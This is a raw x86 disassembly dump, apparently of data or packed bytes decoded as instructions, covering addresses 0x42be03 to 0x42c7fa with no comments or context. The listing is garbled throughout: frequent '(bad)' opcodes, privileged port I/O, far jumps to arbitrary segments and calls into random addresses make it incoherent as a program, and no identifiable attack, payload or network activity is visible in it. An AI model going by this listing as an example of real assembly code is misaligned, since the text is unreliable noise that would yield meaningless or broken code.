  42be03:	mov    dh,0x8a
  42be05:	xor    al,0x66
  42be07:	js     0x42bdf4
  42be09:	push   cs
  42be0a:	mov    edx,0xd1010862
  42be0f:	repnz xchg edx,eax
  42be11:	dec    esp
  42be12:	das    
  42be13:	in     al,dx
  42be14:	cld    
  42be15:	stc    
  42be16:	pop    esi
  42be17:	and    eax,0x85ab39c3
  42be1c:	or     BYTE PTR [edx+0x3],ah
  42be1f:	pop    ss
  42be20:	(bad)  
  42be21:	mov    ds:0x47863233,al
  42be26:	cli    
  42be27:	pop    edx
  42be28:	dec    edx
  42be29:	cmc    
  42be2a:	cmp    ch,BYTE PTR [ecx+0x5]
  42be2d:	leave  
  42be2e:	inc    edi
  42be2f:	fptan  
  42be31:	dec    ebx
  42be32:	iret   
  42be33:	je     0x42be15
  42be35:	ficom  WORD PTR [edx]
  42be37:	ins    BYTE PTR es:[edi],dx
  42be38:	xchg   ebp,eax
  42be39:	xor    dl,BYTE PTR ss:[edi+0x57d9039e]
  42be40:	xchg   DWORD PTR [ecx],esp
  42be42:	mov    esi,0xa2b319ff
  42be47:	or     ebx,DWORD PTR [edx-0x25157e44]
  42be4d:	cld    
  42be4e:	mov    bh,0xc8
  42be50:	pop    es
  42be51:	data16 daa 
  42be53:	dec    edi
  42be54:	scas   al,BYTE PTR es:[edi]
  42be55:	mov    al,dh
  42be57:	sub    ebp,DWORD PTR cs:[edx]
  42be5a:	cmp    DWORD PTR [esi+0x5f],0xca68158a
  42be61:	mov    ch,0xc7
  42be63:	and    al,0xcc
  42be65:	aaa    
  42be66:	dec    esi
  42be67:	je     0x42be3c
  42be69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42be6a:	pop    ebx
  42be6b:	push   ss
  42be6c:	xchg   edx,eax
  42be6d:	sub    BYTE PTR [ecx+eax*2],cl
  42be70:	adc    dh,ch
  42be72:	ins    BYTE PTR es:[edi],dx
  42be73:	mov    ebp,0xf2f65df8
  42be78:	jnp    0x42beef
  42be7a:	add    BYTE PTR [ecx-0x6ec7418d],al
  42be80:	dec    eax
  42be81:	xor    al,0xaa
  42be83:	call   0x6b8df68a
  42be88:	dec    esp
  42be89:	mov    dl,0x1
  42be8b:	push   ecx
  42be8c:	add    edx,DWORD PTR gs:[edx-0x14]
  42be90:	cmp    DWORD PTR [eax],eax
	...
  42bef2:	add    BYTE PTR [eax],al
  42bef4:	xchg   edi,eax
  42bef5:	and    BYTE PTR [edi-0x26],al
  42bef8:	idiv   edi
  42befa:	lahf   
  42befb:	ins    DWORD PTR es:[edi],dx
  42befc:	mov    ds:0x2b7bd7c8,eax
  42bf01:	repz mov edx,0x1d6dcd4
  42bf07:	add    BYTE PTR ds:0xf5000001,al
  42bf0d:	sbb    eax,0x467f0c48
  42bf12:	and    eax,0x224d0d42
  42bf17:	adc    ebp,0x79
  42bf1a:	or     eax,0xdbb643c4
  42bf1f:	and    al,BYTE PTR [ebx-0x75]
  42bf22:	sbb    BYTE PTR [esp+ebp*4],0x57
  42bf26:	retf   0x8409
  42bf29:	test   al,0x55
  42bf2b:	imul   esp,DWORD PTR [eax],0xffffff8e
  42bf2e:	inc    ebp
  42bf2f:	jnp    0x42bf91
  42bf31:	out    dx,al
  42bf32:	pop    edi
  42bf33:	mov    eax,ds:0xa7b51445
  42bf38:	cmp    edi,esp
  42bf3a:	(bad)  [ecx+edx*8+0xae55330]
  42bf41:	in     al,0x5b
  42bf43:	pop    ecx
  42bf44:	sar    BYTE PTR [ebp-0x12],1
  42bf47:	push   0x947e004d
  42bf4c:	mov    eax,ds:0x9905e85d
  42bf51:	adc    dl,ch
  42bf53:	push   DWORD PTR [edx+0x6ad8c375]
  42bf59:	(bad)  
  42bf5a:	mov    bl,0x96
  42bf5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bf5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bf5e:	mov    ?,WORD PTR [ebx]
  42bf60:	mov    eax,ds:0x30d628c8
  42bf65:	mov    ds:0x37a7b9c8,eax
  42bf6a:	popf   
  42bf6b:	jns    0x42bf40
  42bf6d:	or     ah,BYTE PTR [esi+0x4dcbda20]
  42bf73:	jno    0x42bfd9
  42bf75:	cmp    al,0xc7
  42bf77:	or     BYTE PTR [edi-0x30b72dc8],al
  42bf7d:	lds    ebx,FWORD PTR [eax-0x65582e72]
  42bf83:	rcr    BYTE PTR [ebx-0xf],cl
  42bf86:	iret   
  42bf87:	sar    BYTE PTR [esi],cl
  42bf89:	imul   esp,DWORD PTR ds:0xbf440a95,0x67
  42bf90:	stc    
  42bf91:	daa    
  42bf92:	std    
  42bf93:	sbb    al,0xaa
  42bf95:	aaa    
  42bf96:	loope  0x42bfa0
  42bf98:	out    dx,al
  42bf99:	pop    es
  42bf9a:	test   BYTE PTR [ecx+eax*4+0x4b2b2b61],al
  42bfa1:	inc    eax
  42bfa2:	in     al,0x2c
  42bfa4:	xchg   edx,eax
  42bfa5:	xor    eax,0x2cb72cdf
  42bfaa:	mov    DWORD PTR [ecx+ebx*1+0x1c956d41],eax
  42bfb1:	push   0xa52aa446
  42bfb6:	xchg   ebp,eax
  42bfb7:	xor    esi,DWORD PTR [ecx+0x46bd47b4]
  42bfbd:	repnz (bad) 
  42bfbf:	aas    
  42bfc0:	adc    ecx,ecx
  42bfc2:	je     0x42bfab
  42bfc4:	(bad)  
  42bfc5:	push   0xfffffff4
  42bfc7:	and    DWORD PTR [ebx-0xab9f23f],edx
  42bfcd:	sbb    ebx,ebp
  42bfcf:	sub    bh,ch
  42bfd1:	add    bp,WORD PTR ds:[ebp-0x6a]
  42bfd6:	into   
  42bfd7:	adc    dl,BYTE PTR [ebx-0x6b]
  42bfda:	into   
  42bfdb:	pushf  
  42bfdc:	xchg   esi,eax
  42bfde:	(bad)  
  42bfdf:	adc    DWORD PTR [eax-0x41],esi
  42bfe2:	pop    ss
  42bfe3:	xchg   esi,eax
  42bfe4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bfe5:	push   ebp
  42bfe6:	and    BYTE PTR [edx+0x4a],0xa5
  42bfea:	add    al,0xa2
  42bfec:	fistp  DWORD PTR [ebx-0x4744f10f]
  42bff2:	jg     0x42bf99
  42bff4:	cdq    
  42bff5:	out    dx,eax
  42bff6:	mov    al,ds:0xbafa2f22
  42bffb:	fist   DWORD PTR [edi]
  42bffd:	dec    eax
  42bffe:	sbb    edi,DWORD PTR [esi+0x66999bd9]
  42c004:	jmp    0xa6f1:0x2117c02
  42c00b:	in     eax,0x95
  42c00d:	or     DWORD PTR [ebp+0x32f3],ebp
	...
  42c073:	add    BYTE PTR [edx],bh
  42c075:	xchg   edx,eax
  42c076:	ja     0x42c0aa
  42c078:	push   edi
  42c07a:	jg     0x42c016
  42c07c:	leave  
  42c07d:	or     DWORD PTR [edi-0x57],edi
  42c080:	pop    edi
  42c081:	cwde   
  42c082:	hlt    
  42c083:	dec    esp
  42c084:	loope  0x42c05d
  42c086:	add    DWORD PTR [eax],eax
  42c088:	add    eax,0x33000001
  42c08d:	scas   al,BYTE PTR es:[edi]
  42c08e:	clc    
  42c08f:	dec    ebp
  42c090:	in     al,0x87
  42c092:	addr16 mov dl,0x82
  42c095:	stos   BYTE PTR es:[edi],al
  42c096:	jp     0x42c0dd
  42c098:	outs   dx,DWORD PTR ds:[esi]
  42c099:	test   DWORD PTR [ebp+0x6d6dd9a5],ebp
  42c09f:	leave  
  42c0a0:	jg     0x42c07a
  42c0a2:	jmp    DWORD PTR [eax-0x44]
  42c0a5:	xor    DWORD PTR [eax+edx*4],0x2ba176a2
  42c0ac:	sub    DWORD PTR [esi],0xffffffb4
  42c0af:	jecxz  0x42c110
  42c0b1:	push   0x517e2f01
  42c0b6:	pop    eax
  42c0b7:	pop    ebp
  42c0b8:	inc    ebp
  42c0b9:	push   edx
  42c0ba:	cmp    bl,BYTE PTR [eax+0xe]
  42c0bd:	inc    eax
  42c0be:	push   DWORD PTR [ebx+ebp*8-0x2f87354a]
  42c0c5:	cmp    eax,0x5c64021f
  42c0ca:	xchg   edi,eax
  42c0cb:	loop   0x42c0c3
  42c0cd:	mov    ecx,0x1bf7e56c
  42c0d2:	adc    DWORD PTR [edx+ecx*1+0x48],esp
  42c0d6:	xchg   esp,eax
  42c0d7:	frstor [ecx]
  42c0d9:	pop    edi
  42c0da:	das    
  42c0db:	pushf  
  42c0dc:	jbe    0x42c10c
  42c0de:	mov    ecx,DWORD PTR [eax+eiz*2-0x54]
  42c0e2:	and    al,0x8
  42c0e4:	enter  0x8360,0x7f
  42c0e8:	dec    eax
  42c0e9:	dec    esp
  42c0ea:	add    dh,BYTE PTR [ecx]
  42c0ec:	push   eax
  42c0ed:	call   0x3a942069
  42c0f2:	mov    ch,0x87
  42c0f4:	cmp    eax,0x293d5196
  42c0f9:	pop    edi
  42c0fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c0fb:	or     al,0x83
  42c0fd:	cmp    al,0x21
  42c0ff:	mov    al,ds:0x30efac1f
  42c104:	xchg   ecx,eax
  42c105:	cdq    
  42c106:	in     eax,dx
  42c107:	nop
  42c108:	cdq    
  42c109:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c10a:	in     al,0x4a
  42c10c:	push   cs
  42c10d:	adc    al,0x36
  42c10f:	xchg   ebx,eax
  42c110:	mov    edx,0x880bcf97
  42c115:	and    eax,0xcd9e959d
  42c11a:	add    ah,BYTE PTR [ebx]
  42c11c:	cmp    dl,BYTE PTR [esi]
  42c11e:	mov    ebp,DWORD PTR [eax-0x576b0650]
  42c124:	lea    edi,[esi-0x23fc4b5a]
  42c12a:	mov    al,ds:0x75eb0580
  42c12f:	push   esp
  42c130:	inc    eax
  42c131:	inc    esi
  42c132:	sahf   
  42c133:	inc    edi
  42c134:	shr    DWORD PTR [eax],0x5f
  42c137:	cld    
  42c138:	mov    cl,0xb5
  42c13a:	mov    ecx,0x84e7f701
  42c13f:	stc    
  42c140:	out    0x2d,eax
  42c142:	xlat   BYTE PTR ds:[ebx]
  42c143:	cmp    al,0xef
  42c145:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c146:	push   ds
  42c147:	loop   0x42c183
  42c149:	sub    edi,ecx
  42c14b:	cmp    BYTE PTR [edi],dl
  42c14d:	dec    eax
  42c14e:	cld    
  42c14f:	je     0x42c165
  42c151:	mov    ah,0x99
  42c153:	lock mov bh,0xca
  42c156:	xor    DWORD PTR [esi-0x74f494e3],edi
  42c15c:	pop    ebx
  42c15d:	js     0x42c155
  42c15f:	add    al,0xc9
  42c161:	mov    ?,WORD PTR [ebp-0x53]
  42c164:	(bad)  
  42c165:	ins    DWORD PTR es:[edi],dx
  42c166:	push   cs
  42c167:	rcl    BYTE PTR [edi+0x31b9aa0e],cl
  42c16d:	jmp    0x985c:0xa21810d5
  42c174:	adc    edi,DWORD PTR [esi+0x749fe31c]
  42c17a:	xlat   BYTE PTR ds:[ebx]
  42c17b:	cwde   
  42c17c:	scas   eax,DWORD PTR es:[edi]
  42c17d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c17e:	int    0xdc
  42c180:	xchg   BYTE PTR [edi],ch
  42c182:	mul    DWORD PTR [ecx+0x1bc9d342]
  42c188:	mov    dh,0xcd
  42c18a:	pop    ds
  42c18b:	inc    edi
  42c18c:	test   al,0xba
  42c18e:	test   BYTE PTR [edi-0x43],bh
	...
  42c1f1:	add    BYTE PTR [eax],al
  42c1f3:	add    BYTE PTR [ecx-0x7e],ch
  42c1f6:	int    0xae
  42c1f8:	out    dx,eax
  42c1f9:	out    dx,eax
  42c1fa:	imul   eax,edi,0xfffffff2
  42c1fd:	nop
  42c1fe:	xchg   esp,eax
  42c1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c200:	addr16 pop edi
  42c202:	in     al,0xe6
  42c204:	out    0xd8,al
  42c206:	add    DWORD PTR [eax],eax
  42c208:	add    eax,0xb2000001
  42c20d:	sub    eax,ecx
  42c20f:	or     ebx,0xfffffff1
  42c212:	sbb    esp,DWORD PTR [ebx+0x1f]
  42c215:	sub    cl,al
  42c217:	ficomp WORD PTR [edx]
  42c219:	push   ss
  42c21a:	stos   DWORD PTR es:[edi],eax
  42c21b:	mov    edi,DWORD PTR [esi]
  42c21d:	cmc    
  42c21e:	scas   eax,DWORD PTR es:[edi]
  42c21f:	fwait
  42c220:	pop    esp
  42c221:	enter  0x3cf1,0x52
  42c225:	add    dl,BYTE PTR [edi]
  42c227:	adc    DWORD PTR [ebx+0x7c],ecx
  42c22a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c22b:	and    al,0x25
  42c22d:	ds repz inc edi
  42c230:	les    ebp,FWORD PTR [edi+0x293c97bc]
  42c236:	xchg   ebp,eax
  42c237:	jmp    0x42c26f
  42c239:	xlat   BYTE PTR ds:[ebx]
  42c23a:	popf   
  42c23b:	add    edi,DWORD PTR es:[esi]
  42c23e:	sbb    al,0x81
  42c240:	dec    esi
  42c241:	add    cl,0xb3
  42c244:	call   0xc3f0173a
  42c249:	mov    bl,0xa2
  42c24b:	pusha  
  42c24c:	or     esp,DWORD PTR [ecx-0x31]
  42c24f:	in     eax,dx
  42c250:	fwait
  42c251:	mov    bl,0x79
  42c253:	jp     0x42c272
  42c255:	in     eax,dx
  42c256:	push   eax
  42c257:	sbb    BYTE PTR [edi+ecx*1+0x15],dl
  42c25b:	iret   
  42c25c:	ror    DWORD PTR [edi-0x18b414f2],0x49
  42c263:	pop    ds
  42c264:	cs out 0xad,eax
  42c267:	inc    esp
  42c268:	arpl   WORD PTR [eax],dx
  42c26a:	jge    0x42c218
  42c26c:	pop    eax
  42c26d:	stos   DWORD PTR es:[edi],eax
  42c26e:	push   0xffffff87
  42c270:	adc    ecx,edx
  42c272:	mov    dh,0x60
  42c274:	aam    0x7
  42c276:	(bad)  
  42c277:	imul   esi,DWORD PTR [edi],0xffffffa2
  42c27a:	(bad)  
  42c27c:	fcmove st,st(7)
  42c27e:	ins    DWORD PTR es:[edi],dx
  42c27f:	inc    esp
  42c280:	sbb    BYTE PTR [ebx+esi*4],bl
  42c283:	inc    esp
  42c284:	lods   al,BYTE PTR ds:[esi]
  42c285:	xchg   BYTE PTR [edi+edi*4+0x1e0cf986],cl
  42c28c:	jle    0x42c23e
  42c28e:	repz cwde 
  42c290:	mov    dh,0x57
  42c292:	in     al,dx
  42c293:	(bad)  
  42c294:	xchg   edx,eax
  42c295:	dec    ebp
  42c296:	adc    ah,BYTE PTR [edx+0x5f6498ef]
  42c29c:	dec    eax
  42c29d:	jle    0x42c286
  42c29f:	add    BYTE PTR [ebp-0x7d],dl
  42c2a2:	pop    edi
  42c2a3:	mov    ebx,0x50c1249e
  42c2a8:	shr    BYTE PTR [edx+0xe3c9587],0x5a
  42c2af:	nop
  42c2b0:	out    dx,eax
  42c2b1:	dec    ebx
  42c2b2:	aam    0x8f
  42c2b4:	ret    0xb745
  42c2b7:	ror    DWORD PTR [ecx-0x2f],cl
  42c2ba:	lahf   
  42c2bb:	adc    esi,DWORD PTR [edx+0x57]
  42c2be:	cmp    al,0x8b
  42c2c0:	mov    bh,0xff
  42c2c2:	mov    bl,0xf7
  42c2c4:	cdq    
  42c2c5:	aam    0xee
  42c2c7:	mov    al,ds:0x50441c8b
  42c2cc:	popa   
  42c2cd:	or     bl,bl
  42c2cf:	scas   al,BYTE PTR es:[edi]
  42c2d0:	push   es
  42c2d1:	into   
  42c2d2:	cdq    
  42c2d3:	scas   eax,DWORD PTR es:[edi]
  42c2d4:	xchg   edx,eax
  42c2d5:	icebp  
  42c2d6:	das    
  42c2d7:	out    0x1c,eax
  42c2d9:	push   0x75
  42c2db:	aam    0x59
  42c2dd:	test   DWORD PTR [esi+ecx*2-0x11554464],esi
  42c2e4:	pop    esi
  42c2e5:	pop    ss
  42c2e6:	(bad)  
  42c2e7:	inc    DWORD PTR [ebx+ecx*1]
  42c2ea:	fsub   QWORD PTR [edx+eiz*1+0x5e7abc10]
  42c2f1:	sub    edx,DWORD PTR [esi-0x210d77b2]
  42c2f7:	aaa    
  42c2f8:	push   ss
  42c2f9:	test   al,0x79
  42c2fb:	dec    ebx
  42c2fc:	inc    esi
  42c2fd:	pop    ebp
  42c2fe:	inc    ecx
  42c2ff:	jmp    0x42c2f2
  42c301:	pop    eax
  42c302:	cmp    BYTE PTR [edx],bl
  42c304:	inc    esi
  42c305:	adc    ebp,DWORD PTR [edx+0x16]
  42c308:	and    ah,BYTE PTR [eax+0x2950704]
  42c30e:	pop    edx
  42c30f:	iret   
  42c310:	outs   dx,DWORD PTR ds:[esi]
	...
  42c371:	add    BYTE PTR [eax],al
  42c373:	add    dh,ah
  42c375:	psubusw mm5,QWORD PTR [ebp-0x7]
  42c379:	push   esi
  42c37b:	(bad)  
  42c37c:	in     eax,dx
  42c37d:	(bad)  
  42c37e:	sub    eax,0xfd179af6
  42c383:	xor    bl,ch
  42c385:	fld    DWORD PTR [ecx]
  42c387:	add    BYTE PTR ds:0xff000001,al
  42c38d:	fwait
  42c38e:	xchg   edi,eax
  42c38f:	push   ebp
  42c390:	xchg   ebp,eax
  42c391:	(bad)  [ebp-0x54e05bc8]
  42c397:	in     al,0x2c
  42c399:	shl    BYTE PTR [ecx],1
  42c39b:	cmp    ecx,edx
  42c39d:	psrld  mm6,mm7
  42c3a0:	sbb    ebx,ebp
  42c3a2:	cmp    ch,dh
  42c3a4:	add    BYTE PTR [ebp+0x3eca304c],dl
  42c3aa:	loop   0x42c3fd
  42c3ac:	inc    esi
  42c3ad:	mov    edx,0x6afb8851
  42c3b2:	mov    edi,0xf8c863e2
  42c3b7:	lods   al,BYTE PTR ds:[esi]
  42c3b8:	xlat   BYTE PTR ds:[ebx]
  42c3b9:	pop    eax
  42c3ba:	add    al,BYTE PTR [ebx-0x11]
  42c3bd:	fisub  WORD PTR [esi+0x73]
  42c3c0:	mov    eax,ds:0x9a1dc110
  42c3c5:	or     eax,0x6ee43798
  42c3ca:	popf   
  42c3cb:	mov    dl,0x61
  42c3cd:	enter  0xc3f,0xf7
  42c3d1:	mov    edi,0x95ec7ed9
  42c3d6:	cmp    eax,0x7d5fb5d3
  42c3db:	ja     0x42c36c
  42c3dd:	ins    DWORD PTR es:[edi],dx
  42c3de:	mov    eax,0xf5ec3cac
  42c3e3:	sub    DWORD PTR [edx+0x15],ebx
  42c3e6:	xor    BYTE PTR [ebp+0x6639fe61],al
  42c3ec:	mov    edx,0x6a7446f4
  42c3f1:	inc    edx
  42c3f2:	sbb    al,BYTE PTR [edi+ebp*1]
  42c3f5:	inc    ebx
  42c3f6:	inc    eax
  42c3f7:	mov    ds:0x671acea5,al
  42c3fc:	mov    edi,gs
  42c3fe:	pop    eax
  42c3ff:	mov    ah,BYTE PTR [edx]
  42c401:	mov    ds:0xcb2a2d75,eax
  42c406:	ss test al,0x55
  42c409:	(bad)  
  42c40a:	pusha  
  42c40b:	les    ebx,FWORD PTR [esi-0x4f56492d]
  42c411:	push   eax
  42c412:	mov    esi,0x2d95cbb7
  42c417:	sub    al,0x3
  42c419:	cmp    eax,0x49726c62
  42c41e:	imul   eax,DWORD PTR [eax+0x1e],0xffffff88
  42c422:	loope  0x42c46e
  42c424:	push   0xffffffb5
  42c426:	and    al,0xf6
  42c428:	or     bh,ch
  42c42a:	test   al,0x5f
  42c42c:	jl     0x42c463
  42c42e:	or     cl,BYTE PTR fs:[edx-0x2ef9c701]
  42c435:	cmp    eax,0x44871c2
  42c43a:	and    DWORD PTR [edx-0xa],esp
  42c43d:	pop    es
  42c43e:	int3   
  42c43f:	repnz cwde 
  42c441:	sbb    eax,0x7829a97b
  42c446:	inc    esi
  42c447:	addr16 or eax,0xe85d5e6d
  42c44d:	xchg   edx,eax
  42c44e:	xchg   ebx,eax
  42c44f:	add    DWORD PTR [esi],0xffffffb9
  42c452:	sub    dh,cl
  42c454:	nop
  42c455:	or     BYTE PTR [edx+0x58],0x59
  42c459:	call   0x107f9c24
  42c45e:	pop    edi
  42c45f:	adc    BYTE PTR [edi],dl
  42c461:	lds    ebp,FWORD PTR [ebx+0x255bdf6d]
  42c467:	dec    edx
  42c468:	(bad)  
  42c469:	or     dl,BYTE PTR [ebx-0x16]
  42c46c:	xor    al,0xf7
  42c46e:	ins    BYTE PTR es:[edi],dx
  42c46f:	ds push esi
  42c471:	push   ss
  42c472:	retf   
  42c473:	push   ss
  42c474:	mov    al,0x19
  42c476:	cmp    BYTE PTR [edx],0x20
  42c479:	xor    eax,0x472f35ce
  42c47e:	stos   DWORD PTR es:[edi],eax
  42c47f:	mov    ch,0x6c
  42c481:	xchg   ebx,eax
  42c482:	jle    0x42c4af
  42c484:	aad    0x3f
  42c486:	pop    es
  42c487:	jmp    0xd840:0xb335e20a
  42c48e:	mov    eax,ds:0xa59d
	...
  42c4f3:	add    ah,ch
  42c4f5:	sbb    ebp,edx
  42c4f7:	sahf   
  42c4f8:	cmc    
  42c4f9:	fsubp  st(7),st
  42c4fb:	jnp    0x42c4af
  42c4fd:	sti    
  42c4fe:	enter  0xd034,0x12
  42c502:	add    al,0x25
  42c504:	lock fiadd DWORD PTR [ecx]
  42c507:	add    BYTE PTR ds:0xe2000001,al
  42c50d:	jae    0x42c4c0
  42c50f:	mov    al,0x62
  42c511:	jmp    0x42c569
  42c513:	xchg   BYTE PTR [ecx+ebp*8],bh
  42c516:	cmp    cl,BYTE PTR ds:0xc0b49ed3
  42c51c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c51d:	lods   al,BYTE PTR ds:[esi]
  42c51e:	(bad)  
  42c51f:	xchg   esi,eax
  42c520:	in     al,dx
  42c521:	mov    eax,0x483a634
  42c526:	pop    ds
  42c527:	les    ebx,FWORD PTR [edx]
  42c529:	mov    WORD PTR [ebp+0x730ebc4b],gs
  42c52f:	enter  0x4b3d,0x15
  42c533:	mov    dl,0x59
  42c535:	cmp    cl,ah
  42c537:	in     al,dx
  42c538:	add    eax,0xea42a3c9
  42c53d:	loopne 0x42c58f
  42c53f:	ss push eax
  42c541:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c542:	in     eax,0x67
  42c544:	loop   0x42c4e2
  42c546:	neg    ebx
  42c548:	jle    0x42c4e0
  42c54a:	out    0x6d,al
  42c54c:	sbb    al,BYTE PTR ds:0x67f75fa1
  42c552:	cs stos BYTE PTR es:[edi],al
  42c554:	mov    ch,0x68
  42c556:	addr16 push ebx
  42c558:	ins    BYTE PTR es:[edi],dx
  42c559:	mov    eax,0x817369f
  42c55e:	xchg   DWORD PTR [edx],ebx
  42c560:	(bad)  
  42c561:	jmp    0xda3b5369
  42c566:	mov    eax,ds:0x823a863b
  42c56b:	inc    ebp
  42c56c:	jo     0x42c5a2
  42c56e:	ret    
  42c56f:	pushf  
  42c570:	push   ds
  42c571:	sub    dh,cl
  42c573:	loopne 0x42c554
  42c575:	shl    bh,0x3c
  42c578:	pop    es
  42c579:	mov    ds,WORD PTR [edi+edx*1]
  42c57c:	ins    BYTE PTR es:[edi],dx
  42c57d:	mov    bx,0xa63e
  42c581:	push   eax
  42c582:	sti    
  42c583:	cmp    BYTE PTR [eax-0x79],dl
  42c586:	xchg   edx,eax
  42c587:	xchg   ecx,eax
  42c588:	sahf   
  42c589:	adc    edx,edi
  42c58b:	sbb    eax,0x97db35c2
  42c590:	jno    0x42c529
  42c592:	jno    0x42c554
  42c594:	dec    esi
  42c595:	jb     0x42c5d6
  42c597:	and    eax,0x83925a1f
  42c59c:	ret    
  42c59d:	push   ss
  42c59e:	push   ss
  42c59f:	iret   
  42c5a0:	enter  0x6a5e,0x45
  42c5a4:	fnsave [ecx+0x4622c5e1]
  42c5aa:	mov    dh,0x53
  42c5ac:	push   edx
  42c5ad:	sub    al,0xfb
  42c5af:	push   es
  42c5b0:	imul   edx,DWORD PTR [edx],0xb14027cd
  42c5b6:	stos   BYTE PTR es:[edi],al
  42c5b7:	call   0xf536:0xe9141446
  42c5be:	dec    esi
  42c5bf:	call   0x9c6d:0x798d61fe
  42c5c6:	jo     0x42c636
  42c5c8:	hlt    
  42c5c9:	(bad)  
  42c5ca:	xchg   esi,eax
  42c5cb:	iret   
  42c5cc:	data16 (bad) 
  42c5cf:	mov    BYTE PTR [esi+0x7c8a08ae],ch
  42c5d5:	xor    edx,DWORD PTR [eax-0x61]
  42c5d8:	in     al,dx
  42c5d9:	dec    ebp
  42c5da:	xor    eax,0x96f8cea9
  42c5df:	cdq    
  42c5e0:	scas   al,BYTE PTR es:[edi]
  42c5e1:	int    0x39
  42c5e3:	test   al,0x99
  42c5e5:	ja     0x42c606
  42c5e7:	pop    ebp
  42c5e8:	pushf  
  42c5e9:	add    eax,0x3276664
  42c5ee:	add    ebp,esi
  42c5f0:	(bad)  
  42c5f1:	addr16 aas 
  42c5f3:	mov    edi,0xcbfcf0e3
  42c5f8:	xchg   ebx,eax
  42c5f9:	xchg   BYTE PTR [ebp-0x57],al
  42c5fc:	pop    edi
  42c5fd:	adc    BYTE PTR [edx+0x0],dl
  42c600:	ds pop edx
  42c602:	xor    al,0x83
  42c604:	ss dec ecx
  42c606:	sbb    al,0x9
  42c608:	in     eax,dx
  42c609:	loopne 0x42c5c8
  42c60b:	push   0xd5e256f8
  42c610:	test   eax,0x0
	...
  42c671:	add    BYTE PTR [eax],al
  42c673:	add    BYTE PTR [ebp+0x48],bl
  42c676:	jle    0x42c606
  42c678:	jg     0x42c638
  42c67a:	std    
  42c67b:	fstp   TBYTE PTR [ebx-0x53920395]
  42c681:	mov    esp,0xdbf547d2
  42c686:	add    DWORD PTR [eax],eax
  42c688:	add    eax,0xd5000001
  42c68d:	mov    dh,0xa5
  42c68f:	fst    QWORD PTR [ebx]
  42c691:	cmp    eax,0x6929e1ff
  42c696:	xor    DWORD PTR [edi+0x23c14cc7],ebx
  42c69c:	not    DWORD PTR [edx+edi*2-0x5abba67e]
  42c6a3:	cmp    DWORD PTR [ebx],eax
  42c6a5:	add    esi,ebp
  42c6a7:	sub    DWORD PTR [edi+0x4e],eax
  42c6aa:	test   al,0x6f
  42c6ac:	fwait
  42c6ad:	mov    ebx,0x71a92b74
  42c6b2:	pop    esi
  42c6b3:	in     al,dx
  42c6b4:	jne    0x42c661
  42c6b6:	mov    ebx,0xd540b72d
  42c6bb:	fcom   QWORD PTR [ecx-0x79]
  42c6be:	jmp    0xea07:0x89870cbb
  42c6c5:	lods   al,BYTE PTR ds:[esi]
  42c6c6:	imul   ecx,DWORD PTR [esi-0x1a51956c],0xffffffa6
  42c6cd:	mov    ds:0xc6e5b65f,eax
  42c6d2:	adc    al,0xfd
  42c6d4:	dec    edi
  42c6d5:	xchg   esi,eax
  42c6d6:	push   ebp
  42c6d7:	xchg   edi,eax
  42c6d8:	xor    edx,DWORD PTR [ebx]
  42c6da:	jmp    0x42c66e
  42c6dc:	mov    ds:0x79d172f4,al
  42c6e1:	outs   dx,DWORD PTR ds:[esi]
  42c6e2:	js     0x42c6ff
  42c6e4:	mov    esi,0x5114f43
  42c6e9:	add    DWORD PTR [edx],ebx
  42c6eb:	or     eax,0x2f8a21e6
  42c6f0:	pop    ebp
  42c6f1:	xchg   esp,eax
  42c6f2:	fstp   TBYTE PTR [esi-0x76]
  42c6f5:	jmp    0x38d6c2a1
  42c6fa:	and    eax,0x258d093c
  42c6ff:	or     BYTE PTR [ecx],ch
  42c701:	lods   al,BYTE PTR ds:[esi]
  42c702:	xchg   cl,dl
  42c704:	xchg   DWORD PTR [ecx+0x2],esi
  42c707:	dec    esp
  42c708:	cmp    eax,DWORD PTR ss:[esi+0x22]
  42c70c:	test   BYTE PTR [eax+0x8411282],al
  42c712:	stos   BYTE PTR es:[edi],al
  42c713:	inc    ebp
  42c714:	cmp    al,0xc6
  42c716:	aaa    
  42c717:	cli    
  42c718:	xchg   DWORD PTR [esi],ebp
  42c71a:	mov    bh,0xd4
  42c71c:	or     eax,0x91e51298
  42c721:	in     al,0x19
  42c723:	pop    eax
  42c724:	and    al,0xd3
  42c726:	mov    ah,0xa
  42c728:	push   0xd4672268
  42c72d:	sbb    al,BYTE PTR [edi+0x27]
  42c730:	xor    DWORD PTR [ebp+0x326357],edx
  42c736:	div    esp
  42c738:	iret   
  42c739:	xchg   edx,eax
  42c73a:	pop    eax
  42c73b:	add    al,0xab
  42c73d:	or     cl,bh
  42c73f:	dec    edi
  42c740:	pop    esi
  42c741:	imul   ebp,DWORD PTR [ebp+0x67],0x764edea7
  42c748:	cmp    eax,0x3c3f9e33
  42c74d:	mov    edi,DWORD PTR [esi-0x467e9861]
  42c753:	hlt    
  42c754:	add    edi,DWORD PTR [ebx+edx*2]
  42c757:	leave  
  42c758:	imul   BYTE PTR [edx]
  42c75a:	imul   esi,DWORD PTR [edi+ebx*4+0x63],0x6
  42c75f:	push   eax
  42c760:	loop   0x42c758
  42c762:	jne    0x42c760
  42c764:	sbb    eax,0x56e18aaf
  42c769:	stc    
  42c76a:	lds    ecx,FWORD PTR [esi]
  42c76c:	neg    DWORD PTR [ebx-0x893c89e]
  42c772:	out    dx,eax
  42c773:	mov    bh,0x5d
  42c775:	bound  eax,QWORD PTR [edx-0x18ac42ab]
  42c77b:	shl    esi,0xff
  42c77e:	imul   bl
  42c780:	add    dl,BYTE PTR [ebp-0x2e4320b]
  42c786:	fmul   QWORD PTR [esi+ecx*4]
  42c789:	nop
  42c78a:	sbb    DWORD PTR [ebx-0x2b],ebx
  42c78d:	shr    BYTE PTR [ecx+0x37cc],0x0
	...
  42c7f4:	cmp    BYTE PTR [ecx-0x8046a96],cl
  42c7fa:	jmp    FWORD PTR [ebp-0x5bf1e2a3]
